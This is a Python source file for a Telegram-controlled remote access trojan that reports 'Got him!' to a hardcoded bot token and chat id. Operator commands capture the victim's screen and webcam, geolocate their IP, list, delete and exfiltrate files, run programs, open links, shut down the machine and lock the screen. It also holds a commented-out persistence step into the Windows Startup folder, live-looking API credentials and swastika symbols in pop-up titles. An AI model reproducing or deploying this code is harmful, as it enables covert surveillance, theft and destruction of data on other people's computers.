import os
import json
import time
import telebot
from telebot import types
import requests
import cv2
import pyautogui as pg
import platform as pf
import webbrowser
import threading


def blcs():
    for i in range(10):
        pg.moveTo(0, 0)
        time.sleep(1)


def prog():
    path1 = os.path.join(os.path.abspath(os.path.dirname(__file__)))
    path_to_RAT = path1.replace("\\", "/") + "/Tele-bot.py"

    user_name = path1.replace("\\", "/").split("/")[2]
    print(user_name)

    # os.replace(path_to_RAT, f"C:/Users/{user_name}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
    Token = "5480010898:AAHk3NNfod0J3Thh9w8S3rRuBVmDS-I3bgI"
    chat_id = "1041740008"
    bot = telebot.TeleBot(Token)
    requests.post(f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={chat_id}&text=Got him!")

    @bot.message_handler(commands=["help"])
    def cmd(msg):
        bot.send_message(msg.chat.id, """/ip - Ip address of target
    /video - translates screen
    /screen_shot - I wonder what it does?
    /spec - Computer info
    /webcam - Photo from webcam
    /wallpaper - WORK IN PROGRESS...
    /message - Sending an error with text
    /input - Message but with reply
    /open_link - Opens pasted link in browser
    /delete_file - Deletes file
    /create_file - Creates file
    /list_dir - All files in selected path
    /create_folder - Creates folder(s) in selected path
    /delete_folder - Deletes folder) in selected path
    /get_file - downloads file from target computer
    /altf4 - presses Alt + F4 combo on computer of target
    /hideall - Hides all windows
    /max_vol - max volume
    /min_vol - min volume 
    /shutdown - turn off the computer
    /block_screen - blocks screen for 5 minutes
    /show_dir - shows your directory
    /start_file - starts file""")

    @bot.message_handler(commands=['start'])
    def start_message(message):
        # bot.send_message(message.from_user.id, "Howdy, here is commands list!")
        rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btns = ["/ip", "/screen_shot", "/video", "/spec", "/webcam", "/wallpaper", "/message", "/input", "/open_link",
                "/delete_file", "/create_file", "/list_dir", "/create_folder", "/delete_folder", "/get_file", "/altf4",
                "/hideall", "/help", "/max_vol", "/min_vol", "/shutdown", "/block_screen", "/show_dir", "/start_file"]
        for b in btns:
            rmk.add(types.KeyboardButton(b))
        bot.send_message(message.chat.id, "He-he-he, what should we do with him? >:3", reply_markup=rmk)

    @bot.message_handler(commands=['video'])
    def vid(msg: types.Message):
        for i in range(25):
            pg.screenshot("x.jpg")

            with open("x.jpg", "rb") as s:
                bot_mes = bot.send_photo(msg.chat.id, s)
            time.sleep(0.2)
            # bot.delete_message(msg.chat.id, bot_mes.message_id)

    @bot.message_handler(commands=['ip'])
    def get_ip(msg):
        ip = requests.get("http://jsonip.com/").json()
        us_data = requests.get(url=f"http://ip-api.com/json/{ip['ip']}").json()
        bot.send_message(msg.chat.id, f"""Here's his ip address: {ip['ip']}
        
    Country: {us_data['country']}
    
    His region name: {us_data['regionName']}
    
    City he is living in: {us_data['city']}
    
    Width: {us_data['lat']}
    
    Length: {us_data['lon']}
    
    User name: {user_name}
    """)

    @bot.message_handler(commands=["screen_shot"])
    def scrn_shot(msg):
        pg.screenshot("x.jpg")

        with open("x.jpg", "rb") as s:
            bot.send_message(msg.chat.id, "He-he... Interesting...")
            bot.send_photo(msg.chat.id, s)

    @bot.message_handler(commands=["spec"])
    def comp(msg):
        bot.send_message(msg.chat.id, f"""Hmm... So what we got here?
        
    Processor: {pf.processor()}
    
    Machine: {pf.machine()}
    
    System: {pf.system()}
    
    Network name: {pf.node()}""")

    @bot.message_handler(commands=["webcam"])
    def webcam(msg):
        photo = cv2.VideoCapture(0)
        for i in range(30):
            photo.read()

        ret, frame = photo.read()
        cv2.imwrite("wc.jpg", frame)
        photo.release()

        with open("wc.jpg", "rb") as wc:
            bot.send_photo(msg.chat.id, wc)

    @bot.message_handler(commands=["message"])
    def send_mes(msg):
        mes = bot.send_message(msg.chat.id, "What should we say to him? ")
        bot.register_next_step_handler(mes, next_message_sending)

    def next_message_sending(mes):
        try:
            pg.alert(mes.text, "卐s̪̭̱̼̼̉̈́ͪ͋̽̚o͎̜̓̇ͫ̉͊ͨ͊m̘͈̺̪͓ͩ͂̾ͪ̀̋e̮̟͈̣̖̰̩̹͈̾ͨ̑͑t̘̟̼̉̈́͐͋͌̊h͚̖̜̍̃͐i̞̟̫̺ͭ̒ͭͣn͉̠̙͉̗̺̋̋̔ͧ̊g͎͚̥͎͔͕ͥ̿o͎̜̓̇ͫ̉͊ͨ͊f̳͉̼͉̙͔͈̂̉f̳͉̼͉̙͔͈̂̉...卐")
        except Exception:
            bot.send_message(mes.chat.id, "Whoops, sorry mate something went wrong! '>.<")

    @bot.message_handler(commands=["input"])
    def send_mes_input(msg):
        mes = bot.send_message(msg.chat.id, "What should we say to him? ")
        bot.register_next_step_handler(mes, next_message_sending_input)

    def next_message_sending_input(mes):
        try:
            answ = pg.prompt(mes.text, "卐s̪̭̱̼̼̉̈́ͪ͋̽̚o͎̜̓̇ͫ̉͊ͨ͊m̘͈̺̪͓ͩ͂̾ͪ̀̋e̮̟͈̣̖̰̩̹͈̾ͨ̑͑t̘̟̼̉̈́͐͋͌̊h͚̖̜̍̃͐i̞̟̫̺ͭ̒ͭͣn͉̠̙͉̗̺̋̋̔ͧ̊g͎͚̥͎͔͕ͥ̿o͎̜̓̇ͫ̉͊ͨ͊f̳͉̼͉̙͔͈̂̉f̳͉̼͉̙͔͈̂̉...卐")
            bot.send_message(mes.chat.id, f"So his answer is...\n{answ}")
        except Exception:
            bot.send_message(mes.chat.id, "Whoops, sorry mate something went wrong! '>.<")


    @bot.message_handler(commands=["open_link"])
    def open_link(msg):
        try:
            mes = bot.send_message(msg.chat.id, "What link should we open?")
            bot.register_next_step_handler(mes, openlink)
        except:
            bot.send_message(msg.chat.id, "wtf just happend")


    def openlink(mes):
        try:
            webbrowser.open(mes.text, new=0)
        except Exception:
            bot.send_message(mes.chat.id, "Whoops, sorry mate something went wrong! '>.<")


    @bot.message_handler(commands=["delete_file"])
    def del_file(msg):
        mes = bot.send_message(msg.chat.id, "I need file directory!:")
        bot.register_next_step_handler(mes, df)


    def df(mes):
        os.remove(mes.text)


    @bot.message_handler(commands=['create_file'])
    def cr_file(msg):
        mes = bot.send_message(msg.chat.id, "I need path with file's type and name!:")
        bot.register_next_step_handler(mes, cf)


    def cf(mes):
        with open(mes.text, "w") as f:
            pass


    @bot.message_handler(commands=["list_dir"])
    def list_dir(msg):
        mes = bot.send_message(msg.chat.id, "I need path to show files!:")
        bot.register_next_step_handler(mes, ld)


    def ld(mes):
        for i in os.listdir(mes.text):
            try:
                if i[-4] == "." or i[-5] == "." or i[-3] == ".":
                    bot.send_message(mes.chat.id, f"{i} (File)")
                else:
                    bot.send_message(mes.chat.id, f"{i} (Folder)")
            except IndexError:
                bot.send_message(mes.chat.id, f"{i} (idk must be a folder)")


    @bot.message_handler(commands=["create_folder"])
    def cr_fol(msg):
        mes = bot.send_message(msg.chat.id, "Enter folders path pls:")
        bot.register_next_step_handler(mes, cfold)


    def cfold(mes):
        os.makedirs(mes.text, exist_ok=True)


    @bot.message_handler(commands=["delete_folder"])
    def del_fold(msg):
        mes = bot.send_message(msg.chat.id, "Select folder to delete please:")
        bot.register_next_step_handler(mes, dfold)


    def dfold(mes, s=""):
        try:
            if mes is not None:
                s = mes.text
            if os.listdir(s) is not []:
                for i in os.listdir(s):
                    try:
                        os.remove(f"{s}/{i}")
                    except:
                        dfold(None, s=f"{s}/{i}")
            os.rmdir(s)
        except:
            bot.send_message(mes.chat.id, "Sowwy must be an error >.<")


    @bot.message_handler(commands=["altf4"])
    def alt_f4(mes):
        pg.hotkey("alt", "f4")


    @bot.message_handler(commands=["hideall"])
    def hide_all(mes):
        pg.hotkey("win", "d")


    @bot.message_handler(content_types=['document'])
    def send_file(mes):
        bot.send_message(mes.chat.id, f"{mes}")
        get_file_url = f"https://api.telegram.org/bot{Token}/get_File"
        resp = requests.get(url=get_file_url, params={"file_id": f"{mes.document.file_id}"})
        json_resp = json.loads(resp.content)
        get_file_content = f"https://api.telegram.org/file/bot{Token}/" + f"{json_resp['file_path']}"
        resp = requests.get(url=get_file_content.format(file_path=json_resp['result']['file_path'])).content
        with open(f"C:/Users/krutk/Desktop/{mes.document.file_name}", "wb") as f:
            f.write(resp)

    @bot.message_handler(commands=["max_vol"])
    def maxvolume(mes):
        for i in range(100):
            pg.hotkey('shift', 'rightarrow')

    @bot.message_handler(commands=["min_vol"])
    def minvolume(mes):
        for i in range(100):
            pg.hotkey('shift', 'leftarrow')

    @bot.message_handler(commands="shutdown")
    def std(mes):
        os.system("shutdown /s /t 0")

    @bot.message_handler(commands=["show_dir"])
    def show_dir(mes):
        bot.send_message(mes.chat.id, path_to_RAT)

    @bot.message_handler(commands=["start_file"])
    def start_f(mes):
        msg = bot.send_message(mes.chat.id, "Which file to open?:")
        bot.register_next_step_handler(msg, strtf)

    def strtf(msg):
        os.startfile(msg.text)

    @bot.message_handler(commands=["get_file"])
    def get_file(msg):
        mes = bot.send_message(msg.chat.id, "Give me a path to file to download!")
        bot.register_next_step_handler(mes, gf)

    def gf(mes):
        with open(mes.text, 'rb') as f:
            try:
                bot.send_document(mes.chat.id, f)
            except:
                try:
                    bot.send_photo(mes.chat.id, f)
                except:
                    try:
                        bot.send_audio(mes.chat.id, f)
                    except:
                        try:
                            bot.send_video(mes.chat.id, f)
                        except:
                            bot.send_message(mes.chat.id, "Couldnt send needed file")
    bot.polling(none_stop=True)

    @bot.message_handler(commands=["block_screen"])
    def blck_scrn(msg):
        bot.send_message(msg.chat.id, "Screen is blocked!")
        bs = threading.Thread(target=blcs)
        bs.start()


while True:
    try:
        prog()
    except:
        pass
